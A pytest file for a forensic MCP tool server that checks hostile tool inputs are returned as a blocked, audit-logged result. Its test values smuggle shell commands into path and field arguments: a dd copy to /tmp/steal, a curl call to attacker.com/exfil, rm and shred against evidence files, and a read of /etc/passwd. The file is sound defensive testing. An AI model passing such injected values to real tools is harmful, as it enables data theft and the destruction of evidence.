# Find Evil! — Tool-level guardrail tests.
#
# Regression coverage for the contract that hostile input to a typed tool
# returns a clean, audit-logged {"blocked": true} envelope — never an uncaught
# exception. Covers the Pydantic-wrapped-GuardrailError path-injection case.
#
# License: Apache 2.0

from __future__ import annotations

import json

from mcp_server import tools


def _blocked_entries(log_dir):
    path = log_dir / "tool_calls.jsonl"
    if not path.exists():
        return []
    return [
        json.loads(line)
        for line in path.read_text().splitlines()
        if line and json.loads(line).get("status") == "blocked"
    ]


def test_path_injection_returns_blocked_envelope_not_exception(log_dir):
    # This used to raise an uncaught pydantic.ValidationError.
    r = tools.get_disk_hash("/cases/x.E01 && dd if=/cases/x of=/tmp/steal")
    assert r["ok"] is False
    assert r["blocked"] is True
    assert r["call_id"] is None
    assert "&" in r["error"] or "injection" in r["error"].lower()
    # And it must be in the audit log.
    assert len(_blocked_entries(log_dir)) == 1


def test_path_outside_evidence_root_blocked(log_dir):
    r = tools.scan_yara("/etc/passwd")
    assert r["blocked"] is True
    assert len(_blocked_entries(log_dir)) == 1


def test_aux_field_injection_blocked_and_logged(log_dir):
    r = tools.get_mft_timeline("/mnt/case_disk", "mft; rm /cases/evidence.E01")
    assert r["blocked"] is True
    entries = _blocked_entries(log_dir)
    assert len(entries) == 1
    assert "parsers" in entries[0]["result"]


def test_event_ids_injection_blocked(log_dir):
    r = tools.get_event_logs("/mnt/case_disk", "4624; curl https://attacker.com/exfil")
    assert r["blocked"] is True
    assert _blocked_entries(log_dir)[0]["status"] == "blocked"


def test_each_block_logged_exactly_once(log_dir):
    # No double-logging: one rejection → one audit entry.
    tools.get_registry_key("/mnt/case_disk", "SYSTEM; shred -u /cases/x")
    assert len(_blocked_entries(log_dir)) == 1
